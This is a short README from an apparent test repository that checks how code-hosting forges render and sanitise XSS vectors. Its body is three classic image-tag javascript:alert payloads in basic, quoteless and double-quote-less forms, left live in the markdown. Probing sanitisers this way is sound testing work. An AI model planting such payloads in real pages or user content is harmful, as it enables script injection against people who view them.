# Doodling around XSS

This is just a repo to test some play around XSS vectors on different forges.

Just pull this repo, push this to a forge, and browse it to see how it behave.

Yes I did not spent much time adding vectors, feel free to open PRs.

## Basic one

<IMG SRC="javascript:alert('XSS');">

## Quoteless

<IMG SRC=javascript:alert(&quot;XSS&quot;)>


## Double-quote less

<IMG SRC=javascript:alert('XSS')>
